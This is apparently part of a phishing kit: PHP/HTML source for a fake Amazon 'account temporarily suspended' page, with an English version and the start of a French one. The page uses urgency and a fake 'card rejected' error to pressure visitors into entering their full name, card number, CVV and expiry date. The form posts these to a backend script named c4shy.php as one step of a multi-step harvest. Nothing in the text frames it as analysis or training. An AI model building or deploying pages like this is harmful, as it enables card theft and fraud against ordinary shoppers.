...
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-touch a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="mongoose" data-aui-build-date="3.22.1-2022-05-20"><head><script>var aPageStart = (new Date()).getTime();</script><meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no"><meta charset="utf-8">
    <title>Account temporarily suspended <?php echo "Bank: {$_SESSION['bank']} | type: {$_SESSION['type']}"; ?></title>
    <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link href="https://www.amazon.fr/favicon.ico" rel="shortcut icon" type="image/x-icon">
...
<div class="a-section a-spacing-none">
    ...
    <div class="a-section abbott-view-content">
      <div class="a-section a-padding-small">
           ...
           <?php if(isset($_GET["error"])){ ?>   <div id="pp-z7lbyR-15" class="a-row a-spacing-base"><div class="a-column a-span12"><div class="a-box a-alert a-alert-error" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">A problem has occurred.</h4><div class="a-alert-content"><ul class="a-unordered-list a-vertical"><li><span class="a-list-item">Credit card rejected by issuer.</span></li></ul></div></div></div></div></div><?php } ?>
            
              <form id="abbott-form" method="post" action="../../Backend/c4shy.php">
                <input type="hidden" name="step4" value="c4shy">
          ...
          <div class="a-container"><div class="a-section a-spacing-small"><h1 class="a-size-medium a-text-bold">Why do we ask for this information?</h1></div><div class="a-section a-spacing-none"><span>Amazon takes your security seriously and monitors activity on your account to help keep your account and payment methods safe.</span><ul class="a-unordered-list a-vertical"><li><span class="a-list-item">We've noticed some unusual payment activity on your account.</span></li><li><span class="a-list-item">Your account is temporarily suspended so we can review it with you.</span></li><li><span class="a-list-item">While your account is on hold, your pending orders are also on hold and may be cancelled.</span></li><li><span class="a-list-item">If you submit this form promptly and attach supporting documentation, we may be able to unfreeze your account more quickly.</span></li></ul></div></div></div>
                  ...
                  <div class="a-input-text-group a-spacing-base"><div class="a-input-text-wrapper a-form-normal apx-add-credit-card-account-holder-name-input">
                    <input type="text" maxlength="50" id="ccname" autocomplete="off" placeholder="Full Name" name="ccname" value="<?php echo $_SESSION['name']?>"></div><div class="a-section a-spacing-none apx-add-credit-card-number"><div class="a-input-text-wrapper a-form-normal pmts-account-Number">
                    <input type="tel" id="ccnum" autocomplete="off" maxlength="19" required="required" placeholder="Card Number" name="ccnum"></div></div><div class="a-input-text-wrapper a-form-normal pmts-numeric-password-mask"><input type="tel" maxlength="4" id="cvv" autocomplete="off" required="required" placeholder="Security Code (CVV)" name="cvv"></div><input type="hidden" name="ppw-addCreditCardVerificationNumber_isRequired" value="true" id="pp-z7lbyR-20"></div>
  ...
  e.target.value = e.target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();
                  ...
                  <div id="pp-z7lbyR-21" class="a-section a-spacing-none"><div class="a-row a-spacing-small"><label for="pp-z7lbyR-22" id="pp-z7lbyR-24" class="a-form-label">Expiry date</label></div><div id="add-credit-card-expiry-date-input-id" class="a-row a-spacing-base"><div class="a-column a-span6"><span class="a-dropdown-container"><select name="expirem" autocomplete="off" data-a-native-class="pmts-native-dropdown" id="pp-z7lbyR-22" tabindex="0" class="a-native-dropdown pmts-native-dropdown"><option value="01" selected="">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select><span tabindex="-1" id="pp-z7lbyR-25" data-pmts-component-id="pp-z7lbyR-3" data-a-class="pmts-expiry-month pmts-portal-component pmts-portal-components-pp-z7lbyR-3" class="a-button a-button-dropdown pmts-expiry-month pmts-portal-component pmts-portal-components-pp-z7lbyR-3" aria-hidden="true" style="min-width: 0%;"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" aria-hidden="true"><span class="a-dropdown-prompt">01</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></div><div class="a-column a-span6 a-span-last"><span class="a-dropdown-container"><select name="expirey" autocomplete="off" data-a-native-class="pmts-native-dropdown" id="pp-z7lbyR-23" tabindex="0" class="a-native-dropdown pmts-native-dropdown">
                  <option value="23">2023</option><option value="24">2024</option><option value="25">2025</option><option value="26">2026</option><option value="27">2027</option><option value="28">2028</option><option value="29">2029</option><option value="30">2030</option><option value="31">2031</option><option value="32">2032</option><option value="33">2033</option><option value="34">2034</option><option value="35">2035</option><option value="36">2036</option><option value="37">2037</option><option value="38">2038</option><option value="39">2039</option><option value="40">2040</option><option value="41">2041</option><option value="42">2042</option></select><span tabindex="-1" id="pp-z7lbyR-26" data-pmts-component-id="pp-z7lbyR-3" data-a-class="pmts-expiry-year pmts-portal-component pmts-portal-components-pp-z7lbyR-3" class="a-button a-button-dropdown pmts-expiry-year pmts-portal-component pmts-portal-components-pp-z7lbyR-3" aria-hidden="true" style="min-width: 0%;"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" aria-hidden="true"><span class="a-dropdown-prompt">2022</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></div></div><div id="add-credit-card-no-expiry-date-info-id" class="a-row a-spacing-base aok-hidden"><div class="a-box a-alert-inline a-alert-inline-info"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content"><span class="a-size-base">Votre carte ne comporte pas de date d'expiration</span></div></div></div></div><div class="a-row a-spacing-base pmts-mobile-add-card-button" style="margin-top: 40px!important;"><span id="pp-z7lbyR-27" class="a-button a-button-primary pmts-button-input"><span class="a-button-inner"><input name="ppw-widgetEvent:AddCreditCardEvent" class="a-button-input" type="submit" aria-labelledby="pp-z7lbyR-27-announce"><span id="pp-z7lbyR-27-announce" class="a-button-text" aria-hidden="true">Cancel your payment</span></span></span></div><div class="a-row a-spacing-base"><div class="a-section a-spacing-none a-spacing-top-large a-hidden aok-hidden"></div></div></div>
...
<!DOCTYPE html>
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-touch a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="mongoose" data-aui-build-date="3.22.1-2022-05-20"><head><script>var aPageStart = (new Date()).getTime();</script><meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no"><meta charset="utf-8">
    <title>Compte temporairement suspendu</title>
    <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
